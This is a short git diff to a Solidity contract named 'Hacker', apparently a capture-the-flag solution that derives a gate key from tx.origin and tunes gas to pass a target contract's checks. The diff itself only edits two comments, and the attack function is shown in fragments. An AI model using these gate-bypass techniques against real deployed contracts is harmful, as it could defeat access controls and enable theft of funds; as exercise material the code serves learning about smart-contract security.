@@ -14,7 +14,7 @@ contract Hacker {
   }
 
   function attack(address _target) public onlyHacker {
-    // make key
+    // make key, bytes8(bytes20(tx.origin)) produces different result, so...
     bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
 
     // generate goTo function signature
@@ -23,7 +23,7 @@ contract Hacker {
     bool result = false;
 
     // estimated gas
-    uint256 estimatedGas = 426 + 8191 * 10; // gas amount required until reach to gas comparison
+    uint256 estimatedGas = 426 + 8191 * 10; // 426 - gas amount required until reach to gas comparison
 
     assembly {
       // Load the length (first 32 bytes)
